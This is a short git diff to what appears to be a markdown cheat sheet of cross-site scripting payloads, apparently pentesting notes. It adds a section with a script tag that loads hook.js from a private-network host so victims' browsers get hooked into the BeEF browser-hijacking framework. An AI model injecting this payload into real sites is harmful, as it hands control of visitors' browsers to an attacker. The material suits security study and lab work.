@@ -106,6 +106,11 @@ Payloads: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 <script>print(window.location.host)</script>
 
 ```
+## Script from file
+For instance can be used to hook to BeeF browser hijacker.
+```
+<script src="http://192.168.119.xxx:3000/hook.js"></script>
+```
 
 ## iframe injection
 
